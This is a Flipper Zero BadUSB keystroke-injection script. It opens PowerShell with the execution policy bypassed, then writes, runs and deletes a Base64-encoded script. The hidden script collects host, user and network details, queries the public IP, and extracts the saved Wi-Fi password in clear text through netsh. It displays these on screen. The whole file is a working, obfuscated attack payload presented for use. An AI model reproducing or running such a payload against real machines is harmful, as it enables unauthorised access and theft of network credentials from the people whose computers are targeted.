REM ============================================
REM Flipper Zero: Complete System + Wi-Fi Sniffer
REM Fixed version - improved search patterns
REM ============================================

REM Open PowerShell
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal
DELAY 500
ENTER
DELAY 1000

REM Execute Base64-encoded script
STRING $f=[System.IO.Path]::GetTempFileName()+'.ps1';$b64='Q2xlYXItSG9zdApXcml0ZS1Ib3N0ICI9PT0gRkxJUFBFUiBaRVJPLCBXSS1GSSAmIFNZU1RFTSBTTklGRkVSID09PSIgLUZvcmVncm91bmRDb2xvciBDeWFuCldyaXRlLUhvc3QgIkNvbGxlY3RpbmcgZGF0YS4uLiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cKV3JpdGUtSG9zdCAiIgoKIyBTWVNURU0KV3JpdGUtSG9zdCAiPT09IFNZU1RFTSBJTkZPID09PSIgLUZvcmVncm91bmRDb2xvciBHcmVlbgokY29tcHV0ZXIgPSAkZW52OkNPTVBVVEVSTkFNRQokdXNlciA9ICRlbnY6VVNFUk5BTUUKJG9zID0gKEdldC1XbWlPYmplY3QgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uCiR1cHRpbWUgPSBbTWF0aF06OlJvdW5kKCgoR2V0LURhdGUpIC0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lKS5Ub3RhbEhvdXJzLCAxKQpXcml0ZS1Ib3N0ICIgIENvbXB1dGVyOiAgICAgICAgICRjb21wdXRlciIKV3JpdGUtSG9zdCAiICBVc2VyOiAgICAgICAgICAgICAkdXNlciIKV3JpdGUtSG9zdCAiICBPUzogICAgICAgICAgICAgICAkb3MiCldyaXRlLUhvc3QgIiAgVXB0aW1lOiAgICAgICAgICAgJHVwdGltZSBociIKCiMgTkVUV09SSwpXcml0ZS1Ib3N0ICIiCldyaXRlLUhvc3QgIj09PSBORVRXT1JLIElORk8gPT09IiAtRm9yZWdyb3VuZENvbG9yIEJsdWUKCiMgUHVibGljIElQCnRyeSB7CiAgICAkcHVibGljSVAgPSAoSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIiAtVGltZW91dFNlYyAzKQogICAgV3JpdGUtSG9zdCAiICBQdWJsaWMgSVA6ICAgICAgICAgICRwdWJsaWNJUCIKfSBjYXRjaCB7CiAgICBXcml0ZS1Ib3N0ICIgIFB1YmxpYyBJUDogICAgICAgICAgRVJST1IiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAkcHVibGljSVAgPSAiRVJST1IiCn0KCiMgTG9jYWwgbmV0d29yayAtIGltcHJvdmVkIHNlYXJjaAokbmV0d29yayA9IGlwY29uZmlnIC9hbGwgMj4kbnVsbAokbG9jYWxJUCA9ICIiCiRtYWMgPSAiIgokZ2F0ZXdheSA9ICIiCgojIElQdjQgLSB0cnkgbXVsdGlwbGUgbWV0aG9kcwokaXBNYXRjaGVzID0gJG5ldHdvcmsgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdJUHY0IEFkZHJlc3NbXjpdKjpccyooXGQrXC5cZCtcLlxkK1wuXGQrKScgLUFsbE1hdGNoZXMKaWYgKCRpcE1hdGNoZXMpIHsKICAgIGZvcmVhY2ggKCRtYXRjaCBpbiAkaXBNYXRjaGVzLk1hdGNoZXMpIHsKICAgICAgICAkaXAgPSAkbWF0Y2guR3JvdXBzWzFdLlZhbHVlLlRyaW0oKQogICAgICAgIGlmICgkaXAgLW5lICIxMjcuMC4wLjEiIC1hbmQgJGlwIC1ub3RtYXRjaCAiXjE2OVwuMjU0XC4iKSB7CiAgICAgICAgICAgICRsb2NhbElQID0gJGlwCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgfQogICAgfQp9CgojIElmIG5vdCBmb3VuZCwgdHJ5IGFsdGVybmF0aXZlIHBhdHRlcm4KaWYgKCEkbG9jYWxJUCkgewogICAgJGlwTWF0Y2ggPSAkbmV0d29yayB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJ0lQIEFkZHJlc3NbXjpdKjpccyooXGQrXC5cZCtcLlxkK1wuXGQrKScgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICBpZiAoJGlwTWF0Y2ggLWFuZCAkaXBNYXRjaC5NYXRjaGVzLkdyb3Vwcy5Db3VudCAtZ3QgMSkgewogICAgICAgICRpcCA9ICRpcE1hdGNoLk1hdGNoZXMuR3JvdXBzWzFdLlZhbHVlLlRyaW0oKQogICAgICAgIGlmICgkaXAgLW5lICIxMjcuMC4wLjEiIC1hbmQgJGlwIC1ub3RtYXRjaCAiXjE2OVwuMjU0XC4iKSB7CiAgICAgICAgICAgICRsb2NhbElQID0gJGlwCiAgICAgICAgfQogICAgfQp9CgojIE1BQyAtIHRyeSBtdWx0aXBsZSBwYXR0ZXJucwokbWFjTWF0Y2ggPSAkbmV0d29yayB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJ1BoeXNpY2FsIEFkZHJlc3NbXjpdKjpccyooW0EtRjAtOS1dKyknIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQppZiAoISRtYWNNYXRjaCkgewogICAgJG1hY01hdGNoID0gJG5ldHdvcmsgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdNQUMgQWRkcmVzc1teOl0qOlxzKihbQS1GMC05LV0rKScgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCn0KaWYgKCRtYWNNYXRjaCAtYW5kICRtYWNNYXRjaC5NYXRjaGVzLkdyb3Vwcy5Db3VudCAtZ3QgMSkgewogICAgJG1hYyA9ICRtYWNNYXRjaC5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCkKfQoKIyBHYXRld2F5CiRnd01hdGNoID0gJG5ldHdvcmsgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdEZWZhdWx0IEdhdGV3YXlbXjpdKjpccyooXGQrXC5cZCtcLlxkK1wuXGQrKScgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCmlmICghJGd3TWF0Y2gpIHsKICAgICRnd01hdGNoID0gJG5ldHdvcmsgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdHYXRld2F5W146XSo6XHMqKFxkK1wuXGQrXC5cZCtcLlxkKyknIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQp9CmlmICgkZ3dNYXRjaCAtYW5kICRnd01hdGNoLk1hdGNoZXMuR3JvdXBzLkNvdW50IC1ndCAxKSB7CiAgICAkZ2F0ZXdheSA9ICRnd01hdGNoLk1hdGNoZXMuR3JvdXBzWzFdLlZhbHVlLlRyaW0oKQp9CgpXcml0ZS1Ib3N0ICIgIExvY2FsIElQOiAgICAgICAgICAgJChpZiAoJGxvY2FsSVApIHsgJGxvY2FsSVAgfSBlbHNlIHsgJ05vdCBmb3VuZCcgfSkiCldyaXRlLUhvc3QgIiAgTUFDIEFkZHJlc3M6ICAgICAgICAkKGlmICgkbWFjKSB7ICRtYWMgfSBlbHNlIHsgJ05vdCBmb3VuZCcgfSkiCldyaXRlLUhvc3QgIiAgR2F0ZXdheTogICAgICAgICAgICAkKGlmICgkZ2F0ZXdheSkgeyAkZ2F0ZXdheSB9IGVsc2UgeyAnTm90IGZvdW5kJyB9KSIKCiMgV0ktRkkKV3JpdGUtSG9zdCAiIgpXcml0ZS1Ib3N0ICI9PT0gV0ktRkkgSU5GTyA9PT0iIC1Gb3JlZ3JvdW5kQ29sb3IgTWFnZW50YQoKJHdpZmkgPSBuZXRzaCB3bGFuIHNob3cgaW50ZXJmYWNlcyAyPiRudWxsCiRzc2lkID0gIiIKJGJzc2lkID0gIiIKJHNpZ25hbCA9ICIiCiRwYXNzd29yZCA9ICJOT19BRE1JTl9SSUdIVFMiCgppZiAoJHdpZmkpIHsKICAgICMgU1NJRAogICAgJHNzaWRNYXRjaCA9ICR3aWZpIHwgU2VsZWN0LVN0cmluZyAtUGF0dGVybiAnU1NJRFxzKjpccyooLispJyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgIGlmICgkc3NpZE1hdGNoIC1hbmQgJHNzaWRNYXRjaC5NYXRjaGVzLkdyb3Vwcy5Db3VudCAtZ3QgMSkgewogICAgICAgICRzc2lkID0gJHNzaWRNYXRjaC5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCkKICAgIH0KCiAgICAjIEJTU0lECiAgICAkYnNzaWRNYXRjaCA9ICR3aWZpIHwgU2VsZWN0LVN0cmluZyAtUGF0dGVybiAnQlNTSURccys6XHMqKC4rKScgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICBpZiAoISRic3NpZE1hdGNoKSB7CiAgICAgICAgJGJzc2lkTWF0Y2ggPSAkd2lmaSB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJ0JTU0lEXHMqOlxzKiguKiknIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgaWYgKCRic3NpZE1hdGNoIC1hbmQgJGJzc2lkTWF0Y2guTWF0Y2hlcy5Hcm91cHMuQ291bnQgLWd0IDEpIHsKICAgICAgICAkYnNzaWQgPSAkYnNzaWRNYXRjaC5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCkKICAgIH0KCiAgICAjIFNpZ25hbCAtIHRyeSBtdWx0aXBsZSBwYXR0ZXJucwogICAgJHNpZ25hbE1hdGNoID0gJHdpZmkgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdTaWduYWxbXjpdKjpccyooXGQrJSUpJyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgIGlmICghJHNpZ25hbE1hdGNoKSB7CiAgICAgICAgJHNpZ25hbE1hdGNoID0gJHdpZmkgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICdTaWduYWxbXjpdKjpccyooXGQrJSknIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgaWYgKCEkc2lnbmFsTWF0Y2gpIHsKICAgICAgICAkc2lnbmFsTWF0Y2ggPSAkd2lmaSB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gJ1NpZ25hbFteOl0qOlxzKihcZCspJyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgIH0KICAgIGlmICgkc2lnbmFsTWF0Y2ggLWFuZCAkc2lnbmFsTWF0Y2guTWF0Y2hlcy5Hcm91cHMuQ291bnQgLWd0IDEpIHsKICAgICAgICAkc2lnbmFsID0gJHNpZ25hbE1hdGNoLk1hdGNoZXMuR3JvdXBzWzFdLlZhbHVlLlRyaW0oKQogICAgICAgIGlmICgkc2lnbmFsIC1ub3RtYXRjaCAnJScpIHsKICAgICAgICAgICAgJHNpZ25hbCA9ICRzaWduYWwgKyAnJScKICAgICAgICB9CiAgICB9CgogICAgV3JpdGUtSG9zdCAiICBDdXJyZW50IFdpLUZpOiAgICAgICQoaWYgKCRzc2lkKSB7ICRzc2lkIH0gZWxzZSB7ICdOb3QgZm91bmQnIH0pIgogICAgV3JpdGUtSG9zdCAiICBCU1NJRCAoTUFDKTogICAgICAgICQoaWYgKCRic3NpZCkgeyAkYnNzaWQgfSBlbHNlIHsgJ05vdCBmb3VuZCcgfSkiCiAgICBXcml0ZS1Ib3N0ICIgIFNpZ25hbCBTdHJlbmd0aDogICAkKGlmICgkc2lnbmFsKSB7ICRzaWduYWwgfSBlbHNlIHsgJ05vdCBmb3VuZCcgfSkiCgogICAgIyBQYXNzd29yZAogICAgaWYgKCRzc2lkKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHByb2ZpbGUgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSBuYW1lPSIkc3NpZCIga2V5PWNsZWFyIDI+JG51bGwKICAgICAgICAgICAgaWYgKCRwcm9maWxlIC1tYXRjaCAnS2V5IENvbnRlbnRccyo6XHMqKC4rKScpIHsKICAgICAgICAgICAgICAgICRwYXNzd29yZCA9ICRtYXRjaGVzWzFdLlRyaW0oKQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiICBQYXNzd29yZDogICAgICAgICAgICRwYXNzd29yZCIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiICBQYXNzd29yZDogICAgICAgICAgIEFETUlOIFJJR0hUUyBSRVFVSVJFRCIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1Ib3N0ICIgIFBhc3N3b3JkOiAgICAgICAgICAgRVJST1IiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAgICAgfQogICAgfQp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAiICBObyBXaS1GaSBjb25uZWN0aW9uIGZvdW5kIiAtRm9yZWdyb3VuZENvbG9yIFJlZAp9CgojIFBST0NFU1NFUwpXcml0ZS1Ib3N0ICIiCldyaXRlLUhvc3QgIj09PSBQUk9DRVNTRVMgPT09IiAtRm9yZWdyb3VuZENvbG9yIEN5YW4KJHByb2Nlc3NlcyA9IEdldC1Qcm9jZXNzIHwgU29ydC1PYmplY3QgQ1BVIC1EZXNjZW5kaW5nIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgNQpXcml0ZS1Ib3N0ICIgIFRvcCA1IHByb2Nlc3NlcyBieSBDUFUgTG9hZDoiCmZvcmVhY2ggKCRwcm9jIGluICRwcm9jZXNzZXMpIHsKICAgICRjcHVQZXJjZW50ID0gW01hdGhdOjpSb3VuZCgkcHJvYy5DUFUsIDIpCiAgICAkcmFtTUIgPSBbTWF0aF06OlJvdW5kKCRwcm9jLlBNIC8gMU1CLCAyKQogICAgV3JpdGUtSG9zdCAiICAgICAkKCRwcm9jLk5hbWUuUGFkUmlnaHQoMjUpKSA6IENQVSAtICRjcHVQZXJjZW50JSwgUkFNIC0gJHJhbU1CIE1CIgp9CgojIFNVTU1BUlkKV3JpdGUtSG9zdCAiIgpXcml0ZS1Ib3N0ICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IiAtRm9yZWdyb3VuZENvbG9yIEN5YW4KV3JpdGUtSG9zdCAiICAgIFNVTU1BUlkiIC1CYWNrZ3JvdW5kQ29sb3IgQmxhY2sgLUZvcmVncm91bmRDb2xvciBZZWxsb3cKCldyaXRlLUhvc3QgIiAgICA+IENvbXB1dGVyOiAgICAgICAkY29tcHV0ZXIiCldyaXRlLUhvc3QgIiAgICA+IFVzZXI6ICAgICAgICAgICAkKGlmICgkdXNlcikgeyAkdXNlciB9IGVsc2UgeyAnVU5LTk9XTicgfSkiCldyaXRlLUhvc3QgIiAgICA+IFB1YmxpYyBJUDogICAgICAkcHVibGljSVAiCldyaXRlLUhvc3QgIiAgICA+IExvY2FsIElQOiAgICAgICAkKGlmICgkbG9jYWxJUCkgeyAkbG9jYWxJUCB9IGVsc2UgeyAnTm90IGZvdW5kJyB9KSIKV3JpdGUtSG9zdCAiICAgID4gTUFDOiAgICAgICAgICAgICQoaWYgKCRtYWMpIHsgJG1hYyB9IGVsc2UgeyAnTm90IGZvdW5kJyB9KSIKV3JpdGUtSG9zdCAiICAgID4gV2ktRmkgU1NJRDogICAgICQoaWYgKCRzc2lkKSB7ICRzc2lkIH0gZWxzZSB7ICdOb25lJyB9KSIKV3JpdGUtSG9zdCAiICAgID4gV2ktRmkgUGFzc3dvcmQ6ICRwYXNzd29yZCIKV3JpdGUtSG9zdCAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIgLUZvcmVncm91bmRDb2xvciBDeWFuCgpXcml0ZS1Ib3N0ICIiCldyaXRlLUhvc3QgIlByZXNzIGFueSBrZXkgdG8gZXhpdC4uLiIgLUZvcmVncm91bmRDb2xvciBHcmF5CiRudWxsID0gJEhvc3QuVUkuUmF3VUkuUmVhZEtleSgnTm9FY2hvLEluY2x1ZGVLZXlEb3duJykK';[System.IO.File]::WriteAllBytes($f,[System.Convert]::FromBase64String($b64));& $f;Remove-Item $f -Force -ErrorAction SilentlyContinue
ENTER
DELAY 100
